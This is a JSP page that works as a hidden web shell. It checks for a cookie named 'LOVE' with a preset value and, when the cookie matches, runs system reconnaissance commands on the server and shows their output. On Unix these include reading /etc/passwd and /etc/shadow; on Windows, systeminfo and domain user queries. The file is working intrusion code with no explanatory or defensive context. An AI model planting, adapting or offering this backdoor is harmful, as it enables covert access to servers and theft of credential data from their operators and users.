<%@ page import="java.io.*" %>
<%
    String cookieValue = "your_cookie_value"; // replace with your cookie value
    String inputCookieValue = null;
    javax.servlet.http.Cookie[] cookies = request.getCookies();
    if (cookies != null) {
        for (javax.servlet.http.Cookie cookie : cookies) {
        	if (cookie.getName().equals("LOVE")) {
            	inputCookieValue = cookie.getValue();
                	break;
            }
        }
    }

    if (cookieValue.equals(inputCookieValue)) {
        int osType;
        String osName = System.getProperty("os.name").toLowerCase();
        String[] commands = null;
        if (osName.contains("win")) {
            commands = new String[]{"whoami", "ipconfig", "systeminfo", "whoami /upn", "net user %username% /domain", "dir c:/users"};
        } else if (osName.contains("nix") || osName.contains("nux") || osName.contains("mac")) {
            commands = new String[]{"whoami","ip addr", "uname -a","cat /etc/issue", "cat /etc/hosts", "cat /etc/passwd", "cat /etc/shadow"};
        } else {
            commands = new String[]{};
        }
        out.println("<style>body { font-family: Arial, sans-serif; } .command { color: #008000; }  .error { color: red; } .output { color: #0000FF; }</style>");
        // String[] 
        for (String command : commands) {
            try {
                Process p = Runtime.getRuntime().exec(command);
                BufferedReader in = new BufferedReader(new InputStreamReader(p.getInputStream()));
                String line;
                out.println("<p class='command'>" + command + "</p>");
                while ((line = in.readLine()) != null) {
                    out.println("<p class='output'>" + line + "</p>");
                }
            } catch (Exception  e) {
                out.println("<p class='error'>Error: " + e.getMessage() + "</p>");
            }           
            
        }
    } else {
        out.println("Access denied.");
    }
%>
